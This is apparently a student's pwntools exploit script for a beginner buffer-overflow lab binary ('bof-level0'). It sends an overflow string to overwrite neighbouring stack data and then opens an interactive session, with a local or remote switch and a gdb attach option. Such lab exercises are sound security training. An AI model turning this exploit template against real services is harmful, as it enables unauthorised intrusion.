#!/usr/bin/env python

from pwn import *  # pylint: disable=unused-wildcard-import
import os, sys

context(arch="amd64")

HOST="asdf"
PORT=12345
REMOTE_LIBC="libc.so.6"

BINARY="/home/labs/week2/bof-level0/bof-level0"
LOCAL_LIBC=os.environ['LIBC'] if 'LIBC' in os.environ else "/lib/x86_64-linux-gnu/libc.so.6"

if "remote" in sys.argv:
    p = remote(HOST, PORT)
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass
else:
    p = process(BINARY)
    libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-v']  # pylint: disable=assigning-non-slot
    gdb.attach(p)  # pylint: disable=undefined-variable

########################################################


def exploit():
    log.info("wuddup")

    p.sendline("a"*20 + "ABCD" + "EFGH")
    p.interactive()


########################################################

if __name__ == "__main__":
    exploit()
